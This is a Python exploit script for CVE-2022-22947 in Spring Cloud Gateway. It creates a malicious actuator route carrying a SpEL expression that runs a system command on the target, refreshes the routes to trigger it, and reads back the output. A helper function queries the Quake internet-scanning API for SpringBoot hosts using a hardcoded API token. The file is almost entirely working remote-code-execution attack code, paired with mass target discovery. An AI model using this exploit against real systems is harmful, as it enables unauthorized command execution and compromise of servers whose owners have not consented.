#!/usr/local/env python3
#-*- coding: utf-8 -*-
#author: greetdawn

import requests
import sys
import json


"""
	cve-2022-22947
	利用:
		- 创建恶意路由发送恶意SpEL数据包 post : /actuator/gateway/routes/greetdawn
		- 应用路由触发表达式: POST: /actuator/gateway/refresh
		- 请求恶意路由:
"""

HEADERS = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
	"Accept": "*/*",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en",
	"Content-Type": "application/json",
	"Connection": "close"
}

DATA = {
	"id": "greetdawn",
		"filters": [{
			"name": "AddResponseHeader",
			"args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
		}],
	"uri": "http://example.com",
	"order": 0
}


# 获取fofa接口数据
def search_quake():
	headers = {
    	"X-QuakeToken": "c45de875-e64b-4bbb-91e4-686506c778a4"
	}

	data = {
	    "query": "app: \"SpringBoot框架\"",
	    "start": 0,
	    "size": 10
	}
	response = requests.post(url="https://quake.360.cn/api/v3/search/quake_service", headers=headers, json=data)
	print(response.json())

	


def spring_cloud_spel(url):
	try:
		create_resp = requests.post(url = url + '/actuator/gateway/routes/greetdawn', data = json.dumps(DATA), headers = HEADERS, timeout = 1)
		print(create_resp.text)
		if create_resp.status_code == 201:
			print('[+] created route greetdawn success')
			refresh_resp = requests.post(url = url + '/actuator/gateway/refresh', headers = HEADERS, timeout = 1)
			if refresh_resp.status_code == 200:
				print('[+] refresh route greetdawn success')
				exp_resp = requests.get(url = url + '/actuator/gateway/routes/greetdawn', headers = HEADERS, timeout = 1)
				print(exp_resp.text)
	except Exception as e:
		print(e)

if __name__ == '__main__':
	try:
		ip = sys.argv[1]
		port = sys.argv[2]
	except Exception as e: 
		sys.exit('[-] please input target ip or port')
	url = 'http://' + ip + ':' + port
	print(url)
	spring_cloud_spel(url)
	# search_quake()

